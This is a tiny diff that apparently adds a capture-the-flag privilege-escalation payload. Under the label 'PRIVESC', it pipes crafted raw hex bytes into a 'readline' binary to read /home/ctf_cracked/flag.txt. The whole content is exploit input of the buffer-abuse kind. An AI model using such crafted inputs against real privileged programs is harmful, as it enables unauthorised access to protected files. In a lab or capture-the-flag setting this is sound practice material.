@@ -1,0 +1,2 @@
+PRIVESC
+readline $(printf '\xde\xad\xbe\xef123\xAA\xBB\xCC\xDD\xc0\xff\xee') /home/ctf_cracked/flag.txt
